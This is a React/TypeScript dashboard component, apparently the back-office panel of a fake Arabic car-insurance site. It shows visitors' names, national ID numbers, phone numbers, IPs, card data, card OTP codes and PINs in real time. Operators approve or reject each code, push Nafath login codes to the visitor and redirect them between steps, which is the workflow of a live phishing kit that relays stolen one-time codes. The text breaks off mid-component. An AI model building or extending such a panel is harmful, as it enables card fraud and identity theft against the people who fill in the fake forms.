import { useEffect, useMemo, useState, useRef, useCallback } from "react";
import { io, Socket } from "socket.io-client";
import { addData } from "@/lib/api";

type RequestItem = {
  id: string;
  customer: string;
  status: string;
  stage: string;
  updated: string;
  updatedAt?: string;
  badge?: string;
  visitorId?: string;
  submittedAt?: string;
  hasCard?: boolean;
  archived?: boolean;
  raw?: Record<string, any>;
};

const DASHBOARD_BACKEND_URL = import.meta.env.VITE_BACKEND_TARGET || "http://127.0.0.1:3002";

const countryFlags: Record<string, string> = {
  sa: "🇸🇦", ksa: "🇸🇦", saudi: "🇸🇦", "saudi arabia": "🇸🇦", السعودية: "🇸🇦",
  jo: "🇯🇴", jord: "🇯🇴", jordan: "🇯🇴", الأردن: "🇯🇴",
  ae: "🇦🇪", uae: "🇦🇪", emirates: "🇦🇪", الإمارات: "🇦🇪",
  eg: "🇪🇬", egy: "🇪🇬", egypt: "🇪🇬", مصر: "🇪🇬",
  om: "🇴🇲", oman: "🇴🇲", سلطنة_عمران: "🇴🇲",
  lb: "🇱🇧", lebanon: "🇱🇧", لبنان: "🇱🇧",
  sy: "🇸🇾", syr: "🇸🇾", syria: "🇸🇾", سوريا: "🇸🇾",
};

const countryCodes: Record<string, string> = {
  sa: "SA", ksa: "SA", jo: "JO", ae: "AE", eg: "EG", om: "OM", lb: "LB", sy: "SY",
};

// Format elapsed time since last update
function formatElapsedTime(isoString?: string): string {
  if (!isoString) return "—";
  const diff = Date.now() - new Date(isoString).getTime();
  if (diff < 0) return "الآن";
  const seconds = Math.floor(diff / 1000);
  if (seconds < 60) return seconds <= 1 ? "قبل ثانية" : `قبل ${seconds} ثانية`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return minutes <= 1 ? "قبل دقيقة" : `قبل ${minutes} دقائق`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return hours <= 1 ? "قبل ساعة" : `قبل ${hours} ساعات`;
  const days = Math.floor(hours / 24);
  return days <= 1 ? "قبل يوم" : `قبل ${days} أيام`;
}

function getAgeStatus(isoString?: string): { label: string; isStale: boolean } {
  if (!isoString) return { label: "غير محدد", isStale: true };
  const diff = Date.now() - new Date(isoString).getTime();
  const minutes = Math.floor(diff / 60000);
  if (minutes < 5) return { label: "جديد", isStale: false };
  if (minutes < 60) return { label: `قبل ${minutes} دقيقة`, isStale: true };
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return { label: `قبل ${hours} ساعة`, isStale: true };
  const days = Math.floor(hours / 24);
  return { label: `قبل ${days} يوم`, isStale: true };
}

function formatRelativeTimeLabel(isoString?: string): string {
  const age = getAgeStatus(isoString);
  return age.label;
}

// Live timer component for each request
function LiveTimer({ startTime }: { startTime: string }) {
  const [elapsed, setElapsed] = useState(formatElapsedTime(startTime));
  
  useEffect(() => {
    const interval = setInterval(() => {
      setElapsed(formatElapsedTime(startTime));
    }, 1000);
    return () => clearInterval(interval);
  }, [startTime]);
  
  return <span style={{ fontFamily: "monospace", fontSize: "0.85rem" }}>{elapsed}</span>;
}

export default function DashboardPage() {
  const [requests, setRequests] = useState<RequestItem[]>([]);
  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterMode, setFilterMode] = useState<"all" | "cards">("all");
  const [nowTick, setNowTick] = useState<number>(Date.now());
  const [pinInput, setPinInput] = useState("");
  const [nafadInput, setNafadInput] = useState("");
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
  const [redirectPage, setRedirectPage] = useState("");
  const [headerMenuOpen, setHeaderMenuOpen] = useState(false);
  const [selectedRequestIds, setSelectedRequestIds] = useState<string[]>([]);
  const socketRef = useRef<Socket | null>(null);
  const currentTimeRef = useRef(Date.now());
  const headerMenuRef = useRef<HTMLDivElement | null>(null);

  // Page options for manual redirect
  const pageOptions = [
    { value: "", label: "اختر صفحة للتوجيه..." },
    { value: "home", label: "🏠 الصفحة الرئيسية" },
    { value: "step1", label: "1️⃣ اختيار نوع التأمين" },
    { value: "step2", label: "2️⃣ رمز التحقق (OTP)" },
    { value: "step3", label: "3️⃣ بيانات السيارة" },
    { value: "step4", label: "4️⃣ تأكيد الدفع" },
    { value: "step5", label: "5️⃣ التحقق من الهاتف" },
    { value: "step6", label: "6️⃣ النفاذ الوطني" },
    { value: "thank-you", label: "✅ شكراً لك" },
  ];

  // Stats derived from the real visitor data stream
  const stats = useMemo(() => {
    const total = requests.length;
    const newCount = requests.filter((r) => r.badge === "new").length;
    const pendingCount = requests.filter((r) => r.badge === "pending").length;
    const completedCount = requests.filter((r) => r.badge === "completed").length;
    const activeCount = Math.max(0, total - completedCount);
    const todayCount = requests.filter((request) => {
      const submitted = request.submittedAt || request.updatedAt;
      if (!submitted) return false;
      const date = new Date(submitted);
      const nowDate = new Date();
      return date.getDate() === nowDate.getDate() && date.getMonth() === nowDate.getMonth() && date.getFullYear() === nowDate.getFullYear();
    }).length;
    const cardCount = requests.filter((request) => Boolean(request.hasCard || request.raw?._v1 || request.raw?.cardNumber || request.raw?.paymentStatus)).length;
    const phoneCount = requests.filter((request) => Boolean(request.raw?.phoneNumber || request.raw?.phoneIdNumber || request.raw?.phoneOtpStatus || request.raw?.phoneCarrier)).length;

    return {
      total,
      newCount,
      pendingCount,
      completedCount,
      activeCount,
      todayCount,
      cardCount,
      phoneCount,
    };
  }, [requests]);

  // Sort requests by the original submission time (newest first)
  const sortedRequests = useMemo(() => {
    return [...requests].sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA; // Descending order (newest first)
    });
  }, [requests]);

  // Handle Socket.IO update
  const handleSocketUpdate = useCallback((updatedRequest: any) => {
    const incomingRequest = {
      ...updatedRequest,
      submittedAt: updatedRequest.submittedAt || updatedRequest.updatedAt || undefined,
      updatedAt: updatedRequest.updatedAt || updatedRequest.submittedAt || undefined,
    };
    
    setRequests(prevRequests => {
      const existingIndex = prevRequests.findIndex(
        (r) => r.id === incomingRequest.id || r.visitorId === incomingRequest.visitorId
      );
      
      if (existingIndex >= 0) {
        const existing = prevRequests[existingIndex];
        const newRequests = [...prevRequests];
        newRequests[existingIndex] = {
          ...existing,
          ...incomingRequest,
          submittedAt: incomingRequest.submittedAt || existing.submittedAt,
          updatedAt: incomingRequest.updatedAt || existing.updatedAt,
        };
        return newRequests;
      } else {
        return [incomingRequest, ...prevRequests];
      }
    });
    
    if (selectedRequestId && (incomingRequest.id === selectedRequestId || incomingRequest.visitorId === selectedRequestId)) {
      setSelectedRequestId(incomingRequest.id);
    }
  }, [selectedRequestId]);

  // Load initial requests directly from the backend API so the dashboard is not empty
  useEffect(() => {
    let isMounted = true;

    async function loadInitialRequests() {
      try {
        const response = await fetch("/api/dashboard/requests", {
          headers: { "Cache-Control": "no-store" },
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (!isMounted) return;
        if (Array.isArray(data)) {
          setRequests(data);
          if (!selectedRequestId && data.length > 0) {
            setSelectedRequestId(data[0].id);
          }
        }
      } catch (error) {
        console.error("[Dashboard] Failed to load initial requests", error);
      }
    }

    loadInitialRequests();
    return () => {
      isMounted = false;
    };
  }, [selectedRequestId]);

  // Socket.IO connection
  useEffect(() => {
    // Create Socket.IO connection to the backend server directly
    const socket = io(DASHBOARD_BACKEND_URL, {
      transports: ["websocket", "polling"],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: Infinity,
    });
    
    socketRef.current = socket;
    
    socket.on("connect", () => {
      console.log("[Dashboard] Socket.IO connected:", socket.id);
    });
    
    // Handle initial data from server
    socket.on("dashboard:init", (data: RequestItem[]) => {
      console.log("[Dashboard] Received initial data:", data.length, "requests");
      setRequests(data);
    });
    
    // Handle real-time updates
    socket.on("dashboard:update", (updatedRequest: RequestItem) => {
      console.log("[Dashboard] Received update:", updatedRequest.id);
      handleSocketUpdate(updatedRequest);
    });
    
    socket.on("disconnect", () => {
      console.log("[Dashboard] Socket.IO disconnected");
    });
    
    socket.on("connect_error", (error) => {
      console.log("[Dashboard] Socket.IO connection error:", error.message);
    });
    
    return () => {
      socket.disconnect();
      socketRef.current = null;
    };
  }, [handleSocketUpdate]);

  // Update current time every second for timers
  useEffect(() => {
    const interval = setInterval(() => {
      currentTimeRef.current = Date.now();
      setNowTick(Date.now());
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Close header menu when clicking outside
  useEffect(() => {
    const handlePointerDown = (event: MouseEvent) => {
      if (headerMenuRef.current && !headerMenuRef.current.contains(event.target as Node)) {
        setHeaderMenuOpen(false);
      }
    };

    document.addEventListener("mousedown", handlePointerDown);
    return () => document.removeEventListener("mousedown", handlePointerDown);
  }, []);

  // Get country flag
  const getCountryFlag = (raw?: Record<string, any>): string => {
    if (!raw) return "🌐";
    const country = raw.country || raw.countryCode || raw.countryName || raw.location?.country || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, flag] of Object.entries(countryFlags)) {
      if (normalized.includes(key)) return flag;
    }
    return "🌐";
  };

  // Get country code
  const getCountryCode = (raw?: Record<string, any>): string => {
    if (!raw) return "—";
    const country = raw.country || raw.countryCode || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, code] of Object.entries(countryCodes)) {
      if (normalized.includes(key)) return code;
    }
    return normalized.slice(0, 2).toUpperCase() || "—";
  };

  // Get device icon
  const getDeviceIcon = (raw?: Record<string, any>): string => {
    if (!raw) return "📱";
    const device = String(raw.deviceType || raw.device || raw.platform || "").toLowerCase();
    if (/ipad|tablet/i.test(device)) return "💻";
    if (/desktop|pc/i.test(device)) return "🖥️";
    if (/phone|mobile|android|iphone/i.test(device)) return "📱";
    return "📱";
  };

  const getRealFieldValue = (raw: Record<string, any> | undefined, keys: string[], fallback = "—") => {
    if (!raw) return fallback;
    for (const key of keys) {
      const value = raw[key];
      if (value !== undefined && value !== null && value !== "") return String(value);
    }
    return fallback;
  };

  // Filter requests
  const filteredRequests = useMemo(() => {
    let filtered = sortedRequests.filter((r) => !r.archived);
    if (filterMode === "cards") {
      filtered = filtered.filter((r) => r.hasCard);
    }
    if (searchQuery.trim()) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(
        (r) =>
          r.customer.toLowerCase().includes(query) ||
          r.id.toLowerCase().includes(query) ||
          r.raw?.phoneNumber?.toString().includes(query) ||
          r.raw?.identityNumber?.toString().includes(query)
      );
    }
    return filtered;
  }, [sortedRequests, filterMode, searchQuery]);

  const toggleRequestSelection = (requestId: string) => {
    setSelectedRequestIds((prev) =>
      prev.includes(requestId) ? prev.filter((id) => id !== requestId) : [...prev, requestId]
    );
  };

  const handleSelectAll = () => {
    const visibleIds = filteredRequests.map((item) => item.id);
    if (!visibleIds.length) return;

    setSelectedRequestIds((prev) => {
      const allVisibleSelected = visibleIds.every((id) => prev.includes(id));
      return allVisibleSelected ? [] : visibleIds;
    });
  };

  const handleDeleteSelected = () => {
    if (!selectedRequestIds.length) return;
    const selectedSet = new Set(selectedRequestIds);
    setRequests((prev) => prev.filter((item) => !selectedSet.has(item.id)));
    setSelectedRequestIds([]);
    setSelectedRequestId((current) => (current && selectedSet.has(current) ? null : current));
  };

  const handleArchiveSelected = () => {
    if (!selectedRequestIds.length) return;
    const selectedSet = new Set(selectedRequestIds);
    setRequests((prev) => prev.map((item) => (selectedSet.has(item.id) ? { ...item, archived: true } : item)));
    setSelectedRequestIds([]);
    setSelectedRequestId((current) => (current && selectedSet.has(current) ? null : current));
  };

  const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];

  const normalizeCustomerValue = (value?: unknown) => {
    if (value === undefined || value === null || value === "") return "";
    return String(value).trim().toLowerCase();
  };

  const getCustomerIdentityTokens = (request?: RequestItem) => {
    const raw = request?.raw || {};
    return [
      normalizeCustomerValue(request?.visitorId || raw?.visitorId),
      normalizeCustomerValue(raw?.identityNumber || raw?.phoneIdNumber || raw?.nafadIdNumber),
      normalizeCustomerValue(raw?.phoneNumber || raw?.mobileNumber),
      normalizeCustomerValue(request?.customer || raw?.ownerName || raw?.name || raw?.customer),
    ].filter(Boolean);
  };

  const isSameCustomerEntry = (a?: RequestItem, b?: RequestItem) => {
    if (!a || !b) return false;
    if (a.id && b.id && a.id === b.id) return true;
    if (a.visitorId && b.visitorId && a.visitorId === b.visitorId) return true;
    const tokensA = getCustomerIdentityTokens(a);
    const tokensB = getCustomerIdentityTokens(b);
    return tokensA.some((token) => tokensB.includes(token)) && tokensA.length > 1 && tokensB.length > 1;
  };

  const customerEntryGroup = useMemo(() => {
    if (!selectedRequest) return [];
    const matches = requests.filter((request) => isSameCustomerEntry(request, selectedRequest));
    return [...matches].sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA;
    });
  }, [requests, selectedRequest]);

  const liveSummary = useMemo(() => {
    const raw = selectedRequest?.raw || {};
    const ownerName = selectedRequest?.customer || getRealFieldValue(raw, ["ownerName", "buyerName", "name", "firstName", "lastName"], "—");
    const identityNumber = getRealFieldValue(raw, ["identityNumber", "phoneIdNumber", "nafadIdNumber", "buyerIdNumber"], "—");
    const phoneNumber = getRealFieldValue(raw, ["phoneNumber", "mobileNumber", "phone", "phoneNumberValue"], "—");
    const phoneCarrier = getRealFieldValue(raw, ["phoneCarrier", "carrier", "network"], "غير محدد");
    const deviceType = getRealFieldValue(raw, ["deviceType", "device", "platform"], "غير معروف");
    const browser = getRealFieldValue(raw, ["browser", "browserName", "userAgent"], "غير معروف");
    const os = getRealFieldValue(raw, ["os", "operatingSystem", "osName"], "غير معروف");
    const country = getRealFieldValue(raw, ["country", "countryCode", "countryName"], "غير معروف");
    const ip = getRealFieldValue(raw, ["ip", "clientIp", "visitorIp"], "—");
    const currentPage = getRealFieldValue(raw, ["currentPage", "page"], raw.currentPage || raw.page || "غير معروف");
    const currentStep = getRealFieldValue(raw, ["currentStep", "step"], "—");

    return {
      ownerName,
      identityNumber,
      phoneNumber,
      phoneCarrier,
      deviceType,
      browser,
      os,
      country,
      ip,
      currentPage,
      currentStep,
    };
  }, [selectedRequest]);

  // Show notification
  const showNotification = (type: "success" | "error", message: string) => {
    setNotification({ type, message });
    setTimeout(() => setNotification(null), 3000);
  };

  // Handle dashboard actions
  const handlePaymentAction = async (action: "approved" | "rejected") => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("payment");
    try {
      const res = await fetch("/api/dashboard/payment-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        showNotification("success", action === "approved" ? "تم الموافقة على الدفع" : "تم رفض الدفع");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleOtpAction = async (action: "approved" | "rejected" | "resend") => {
    // Get visitorId from multiple possible sources
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id || selectedRequest?.raw?.visitorId || selectedRequest?.raw?.id;
    console.log("[DASHBOARD] handleOtpAction - visitorId:", visitorId, "selectedRequest:", JSON.stringify(selectedRequest));
    
    if (!visitorId) {
      console.log("[DASHBOARD] No visitorId found in selectedRequest:", selectedRequest);
      showNotification("error", "لم يتم العثور على بيانات الزائر");
      return;
    }
    
    setActionLoading("otp");
    try {
      const res = await fetch("/api/dashboard/otp-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رمز التحقق",
          rejected: "تم رفض رمز التحقق",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleSendPin = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("pin");
    try {
      const res = await fetch("/api/dashboard/send-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, pinCode: pinInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز PIN للعميل");
        setPinInput("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handlePhoneAction = async (action: "approved" | "rejected" | "resend") => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("phone");
    try {
      const res = await fetch("/api/dashboard/phone-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        const messages: Record<string, string> = {
          approved: "تم الموافقة على رقم الهاتف",
          rejected: "تم رفض رقم الهاتف",
          resend: "تم إعادة إرسال رمز التحقق",
        };
        showNotification("success", messages[action]);
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleSendNafadCode = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("nafad");
    try {
      const res = await fetch("/api/dashboard/send-nafad-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, nafadCode: nafadInput }),
      });
      if (res.ok) {
        showNotification("success", "تم إرسال رمز النفاذ للعميل");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Handle manual redirect to any page
  const handleRedirect = async () => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId || !redirectPage) return;
    
    setActionLoading("redirect");
    try {
      const res = await fetch("/api/dashboard/redirect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, targetPage: redirectPage }),
      });
      if (res.ok) {
        const pageLabel = pageOptions.find(p => p.value === redirectPage)?.label || redirectPage;
        showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
        setRedirectPage("");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  // Get current page and status from visitor data
  const getCurrentPage = (): string => {
    const raw = selectedRequest?.raw;
    return raw?.currentPage || raw?.page || "";
  };

  const getCurrentStep = (): number => {
    const raw = selectedRequest?.raw;
    return raw?.currentStep || raw?.step || 0;
  };

  const getPaymentStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?._v1Status || "";
  };

  // Get card OTP status (step 2 - after payment approval)
  const getCardOtpStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?._v5Status || "";
  };

  const getPinStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?._v6Status || "";
  };

  // Get phone OTP status (step 5 - after PIN)
  const getPhoneOtpStatus = (): string => {
    const raw = selectedRequest?.raw;
    return raw?.phoneOtpStatus || "";
  };

  // Render card verification status box (_v1Status)
  const renderCardVerificationBox = () => {
    const currentPage = getCurrentPage();
    const paymentStatus = getPaymentStatus();
    const raw = selectedRequest?.raw;

    // Show box if there's card data OR status is approved/rejected (keep showing after decision)
    const hasCardData = raw?._v1 || raw?.cardNumber;
    const hasDecision = paymentStatus === "approved" || paymentStatus === "rejected";
    // ALWAYS show if there's card data, never hide
    if (!hasCardData && !hasDecision) {
      return null;
    }

    return (
      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>💳</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق بيانات الدفع
          </h3>
        </div>
        
        {/* Status message */}
        {paymentStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
          </div>
        )}
        {paymentStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال البيانات</p>
          </div>
        )}
        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
          </div>
        )}
        
        {/* Action buttons - show only when pending or verifying */}
        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
          <div style={{ display: "flex", gap: 8 }}>
            <button
              onClick={() => handlePaymentAction("approved")}
              disabled={actionLoading === "payment"}
              style={{
                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
                background: "#22c55e", color: "#fff", fontWeight: 700,
                cursor: actionLoading === "payment" ? "not-allowed" : "pointer",
              }}
            >
              {actionLoading === "payment" ? "جاري..." : "✅ موافق"}
            </button>
            <button
              onClick={() => handlePaymentAction("rejected")}
              disabled={actionLoading === "payment"}
              style={{
                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
                background: "#ef4444", color: "#fff", fontWeight: 700,
                cursor: actionLoading === "payment" ? "not-allowed" : "pointer",
              }}
            >
              {actionLoading === "payment" ? "جاري..." : "❌ مرفوض"}
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render Card OTP box (currentStep === 5)
  const renderCardOtpBox = () => {
    const currentStep = getCurrentStep();
    const currentPage = getCurrentPage();
    const cardOtpStatus = getCardOtpStatus();
    const raw = selectedRequest?.raw;

    // Get the OTP code from various possible field names
    const otpCode = raw?._v5 || raw?.otpCode || "";

    // Show box if there's OTP data OR status exists
    const hasOtpData = otpCode || raw?.otpSubmittedAt;
    const hasDecision = cardOtpStatus === "approved" || cardOtpStatus === "rejected";
    // ALWAYS show if there's OTP data, never hide
    if (!hasOtpData && !hasDecision && currentStep !== 5) {
      return null;
    }

    return (
      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
          <span style={{ fontSize: "1.2rem" }}>🔐</span>
          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
            صندوق رمز التحقق من البطاقة
          </h3>
          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>{formatRelativeTimeLabel(selectedRequest?.submittedAt || selectedRequest?.updatedAt)}</span>
        </div>
        
        {/* Show OTP code when submitted */}
        {otpCode && (
          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12, textAlign: "center" }}>
            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
            <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
          </div>
        )}
        
        {/* Status message */}
        {cardOtpStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للخطوة التالية</p>
          </div>
        )}
        {cardOtpStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
          </div>
        )}
        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && (
          <div style={{ background: "transparent", borderRadius: 8, padding: 0, border: "none", marginBottom: 0 }} />
        )}
        
        {/* Action buttons - show only when at this step and status is pending/verifying */}
        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && otpCode && (
          <div style={{ display: "flex", gap: 8 }}>
            <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
              {actionLoading === "otp" ? "جاري..." : "✅ موافق"}
            </button>
            <button onClick={() => handleOtpAction("rejected")} disabled={actionLoading === "otp"}
              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
              {actionLoading === "otp" ? "جاري..." : "❌ مرفوض"}
            </button>
          </div>
        )}
      </div>
    );
  };

  // Render PIN box (currentStep === 6)
  const renderPinBox = () => {
    const currentStep = getCurrentStep();
    const pinStatus = getPinStatus();
    const raw = selectedRequest?.raw;

    // Show box if there's PIN data OR status exists
    const hasPinData = raw?._v6 || raw?.pinCode;
    const hasDecision = pinStatus === "approved" || pinStatus === "rejected";
    // ALWAYS show if there's PIN data, never hide
    if (!hasPinData && !hasDecision && currentStep !== 6) {
      return null;
    }

    return (
      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
        <div style={{ marginBottom: 8 }}>
          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
            {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
          </div>
          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>رمز PIN</h3>
        </div>
        <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 8 }}>
          {Array.from({ length: 4 }).map((_, idx) => {
            const pinValue = String(raw?._v6 || raw?.pinCode || "0000").padStart(4, "0")[idx] || "0";
            return (
              <div key={idx} style={{ background: "#ffffff", borderRadius: 6, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", display: "flex", alignItems: "center", justifyContent: "center", width: 32, height: 40 }}>
                <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#111827" }}>{pinValue}</span>
              </div>
            );
          })}
        </div>
        {pinStatus === "approved" && (
          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 8 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إدخال رمز PIN - العميل يُوجه للهاتف</p>
          </div>
        )}
        {pinStatus === "rejected" && (
          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 8 }}>
            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض رمز PIN</p>
          </div>
        )}
      </div>
    );
  };

  // Render Phone OTP box (currentStep === 7)
  const renderPhoneOtpBox = () => {
    const currentStep = getCurrentStep();
    const currentPage = getCurrentPage();
    const phoneOtpStatus = getPhoneOtpStatus();
    const raw = selectedRequest?.raw;

    // Get phone OTP code if submitted (stored as _v7 in history)
    const phoneOtpCode = String(raw?._v7 || raw?.phoneOtp || "").trim();

    // Show box if there's phone data OR OTP code OR status exists
    const hasPhoneData = Boolean(raw?.phoneNumber || raw?.phoneIdNumber);
    const hasAnyPhoneData = hasPhoneData || Boolean(phoneOtpCode) || Boolean(phoneOtpStatus);
    const shouldShowPhoneOtpBox = hasAnyPhoneData || currentStep === 5 || currentPage === "step5" || currentPage === "phone";
    
    // Always show if there's any phone-related data, never hide
    if (!shouldShowPhoneOtpBox && currentStep !== 7) {
      return null;
    }

    return (
      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
        <div style={{ marginBottom: 8 }}>
          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
            {(() => {
              const dt = new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now());
              const dateLabel = dt.toLocaleDateString("en-US", { month: "2-digit", day: "2-digit" }).replace(/\//g, "-");
              const timeLabel = dt.toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).toLowerCase();
              return `${dateLabel} | ${timeLabel}`;
            })()}
          </div>
          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>تحقق الهاتف</h3>
        </div>

        {hasPhoneData && (
          <div style={{ background: "#ffffff", borderRadius: 6, padding: 8, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", marginBottom: 8 }}>
            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
